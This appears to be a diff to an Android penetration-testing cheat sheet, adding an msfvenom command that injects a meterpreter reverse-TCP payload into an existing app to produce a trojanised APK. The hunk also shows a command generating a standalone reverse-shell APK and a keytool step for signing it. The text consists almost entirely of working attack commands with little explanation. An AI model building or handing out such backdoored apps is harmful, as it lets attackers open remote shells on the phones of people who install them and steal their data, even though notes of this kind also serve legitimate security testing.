@@ -73,6 +73,7 @@ frida-trace -U -i open  full_app_name
 ====================================================================================================
 Generate the malicious apk (reverse shell)
 msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=443 R> android.apk
+msfvenom -x app_want_to_inject.apk -p android/meterpreter/reverse_tcp LHOST=ip LPORT=443 -o Mal_APP.apk
 
 keyGen for sign the apk file
 keytool -genkey -V -keystore key.keystore2 -alias keystore -keyalg RSA -keysize 2048 -validity 10000
